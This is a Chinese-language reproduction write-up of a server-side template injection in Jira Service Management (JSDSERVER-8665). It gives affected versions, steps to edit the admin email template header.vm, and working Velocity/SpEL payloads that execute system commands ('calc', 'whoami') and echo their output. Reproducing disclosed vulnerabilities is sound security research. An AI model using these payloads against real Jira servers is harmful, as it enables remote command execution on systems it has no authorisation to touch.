# 漏洞概述

Atlassian官方发布了一则漏洞通报

<https://jira.atlassian.com/browse/JSDSERVER-8665>

![image.png](https://image.3001.net/images/20210919/1632026292_6146beb4dbcbb5217f750.png!small)

从描述中可以看出，该漏洞是一个服务端模板渲染漏洞，需要Jira Administrator权限，影响版本如下：

  * version < 4.13.9
  * 4.14.0 ≤ version < 4.18.0

# 漏洞复现

下载JiraService Management 4.17.1版本并安装 ，配置SMTP服务器。

![image.png](https://image.3001.net/images/20210919/1632026340_6146bee47553c279a3c19.png!small)

使用管理员登录，进入system/EmailTemplates下载当前模板。

![image.png](https://image.3001.net/images/20210919/1632026356_6146bef4963884c3d2ccf.png!small)

修改并替换header.vm文件。

`$jirautils.loadComponent('java.lang.Runtime',$i18n.getClass())`

![image.png](https://image.3001.net/images/20210919/1632026383_6146bf0f17f81c2371765.png!small)

进入System/SendEmail发送邮件。

![image.png](https://image.3001.net/images/20210919/1632026397_6146bf1d96b9b1f2ee035.png!small)

选择邮件用户。

![image.png](https://image.3001.net/images/20210919/1632026410_6146bf2a3b791d5460520.png!small)

接受邮件，可以看到错误执行结果。

![image.png](https://image.3001.net/images/20210919/1632026421_6146bf35d2255f2597af1.png!small)

![image.png](https://image.3001.net/images/20210919/1632026430_6146bf3e28444f178d192.png!small)

为标准的SPEL表达式注入，参考公开资料，注入命令执行载荷。

`#set($SpelExpressionParser =
$jirautils.loadComponent('org.springframework.expression.spel.standard.SpelExpressionParser',$i18n.getClass()))
$SpelExpressionParser.parseRaw("T(java.lang.Runtime).getRuntime().exec('calc')").getValue()`

![image.png](https://image.3001.net/images/20210919/1632026452_6146bf54abf3b3f1ac005.png!small)

基于IOUtils实现回显。

`#set($SpelExpressionParser =
$jirautils.loadComponent('org.springframework.expression.spel.standard.SpelExpressionParser',$i18n.getClass()))
$SpelExpressionParser.parseRaw("T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())").getValue()`

![image.png](https://image.3001.net/images/20210919/1632026472_6146bf685b715600a8a39.png!small)

# 后记

这个漏洞是利用Email
Templates功能点，基于Velocity模板引擎。通过补丁对比方法可以找到org.springframework.expression.spel.standard.SpelExpressionParser这个类，寻找loadComponents这个功能函数需要技巧。

# 参考

<https://jira.atlassian.com/browse/JSDSERVER-8665>

